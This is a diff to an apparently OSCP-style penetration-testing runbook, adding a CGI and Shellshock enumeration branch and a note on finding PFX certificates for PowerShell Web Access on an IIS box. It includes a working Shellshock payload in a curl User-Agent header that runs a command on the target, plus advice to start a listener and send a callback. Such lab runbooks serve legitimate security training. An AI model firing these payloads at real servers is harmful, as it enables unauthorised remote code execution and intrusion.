@@ -92,6 +92,21 @@ Set `$FQDN` only after a response differs from the baseline, then add the mappin
 | Source archive or compiled artifact | Download it into loot, then open [[OSCP/RUNBOOK V2/Linux - Binary Analysis\|Linux - Binary Analysis]] or [[OSCP/RUNBOOK V2/Linux - Credential Search\|Linux - Credential Search]] |
 | Java plugin or Minecraft web artifact | Use `jar tf`, `javap`, and the [[OSCP/BOXES/WRITE UPS/Linux/Blocky\|Blocky]] pattern |
 
+## CGI and Shellshock branch
+
+When content discovery finds a CGI directory or script, request the directory and enumerate direct files separately. A 403 directory response does not rule out a 200 direct script.
+
+~~~bash
+curl -si "http://$BoxIP:$WebPort/cgi-bin/"
+gobuster dir -u "http://$BoxIP:$WebPort/cgi-bin/" \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x sh,cgi,pl,py -o "$BoxDir/loot/gobuster-cgi.txt"
+curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id'
+~~~
+
+If the response proves command execution, open [[OSCP/RUNBOOK V2/Linux - Shellshock CGI|Linux - Shellshock CGI]], start the listener, and send the callback. Keep the harmless proof and callback output together in loot.
+
 ## 6. Slow response branch
 
 ~~~bash
@@ -108,4 +123,10 @@ If a known static path works but a dynamic API or scanner is slow, increase the 
 - [[OSCP/RUNBOOK V2/Web - Virtual Host Enumeration|RUNBOOK V2 VHost Enumeration]]
 - [[OSCP/COMMAND APPENDIX/Web Applications|Web Applications Command Appendix]]
 - [[OSCP/DECISION TREE/Web Applications (Decision Tree)|Web Applications Decision Tree]]
+
+## Search pattern
+
+When IIS exposes a staff/team page, save the HTML and download every referenced image before moving to generic brute force. If /certsrv returns an AD authentication challenge and a protected /staff path returns 403, preserve those responses and look for PFX/P12 material in readable user profiles. Use the certificate-authenticated PSWA route when the PFX subject identifies a domain user.
+
+See [[OSCP/BOXES/WRITE UPS/AD/Search|Search]] and [[OSCP/RUNBOOK V2/AD - PowerShell Web Access|AD - PowerShell Web Access]].
 - [[05_BURP_SUITE_COMPLETE_GUIDE/05_BURP_SUITE_COMPLETE_GUIDE|Burp Suite guide]]
